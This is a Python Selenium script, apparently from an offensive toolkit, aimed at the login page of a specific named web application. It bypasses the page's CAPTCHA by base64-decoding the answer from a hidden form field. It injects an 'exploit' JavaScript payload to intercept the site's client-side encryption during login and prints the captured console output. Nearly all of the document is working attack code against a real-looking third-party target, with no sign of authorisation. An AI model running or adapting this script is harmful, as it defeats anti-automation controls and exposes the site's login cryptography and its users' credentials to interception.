import sys
import os
import time
import base64
from selenium.webdriver.common.by import By
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from core.behavior import SessionManager

def login_and_intercept(url):
    session_manager = SessionManager(use_browser=True, live_exploit_script="payloads/aes_live.js")
    driver = session_manager.driver
    
    if not driver:
        print("[-] Browser initialization failed.")
        return

    try:
        print(f"[*] Navigating to {url}...")
        driver.get(url)
        time.sleep(3)

        print("[*] Entering fake credentials...")
        username_field = driver.find_element(By.ID, "userid")
        password_field = driver.find_element(By.ID, "password")
        login_button = driver.find_element(By.ID, "login_submit")

        username_field.send_keys("1234567")
        password_field.send_keys("Test@1234567")

        print("[*] Extracting and solving CAPTCHA...")
        captcha_hidden = driver.find_element(By.ID, "captchaValue")
        captcha_val_raw = captcha_hidden.get_attribute("value")
        
        if captcha_val_raw and "|" in captcha_val_raw:
            b64_captcha = captcha_val_raw.split("|")[0]
            captcha_text = base64.b64decode(b64_captcha).decode('utf-8')
            print(f"[+] Decoded CAPTCHA: {captcha_text}")
            
            captcha_input = driver.find_element(By.ID, "captchaInput")
            captcha_input.send_keys(captcha_text)
        else:
            print("[-] Could not find or parse CAPTCHA value.")

        print("[*] Clicking login button to trigger encryption...")
        login_button.click()

        print("[*] Waiting for crypto operations...")
        time.sleep(5)

        print("\n" + "="*60)
        print("                CAPTURED CONSOLE LOGS")
        print("="*60 + "\n")
        
        logs = session_manager.read_console_logs()
        if not logs:
            print("[-] No specific crypto logs were captured by the interceptor.")
            # Print raw logs just in case
            raw_logs = driver.get_log('browser')
            for entry in raw_logs:
                print(f"[{entry['level']}] {entry['message']}")
        else:
            for log in logs:
                print(f"[INTERCEPTED] {log}")

    except Exception as e:
        print(f"[-] An error occurred: {e}")
    finally:
        session_manager.close()

if __name__ == "__main__":
    login_and_intercept("https://mac.mactech.net.in/MFI_AUTOMATION/MFWebApp/userdetails")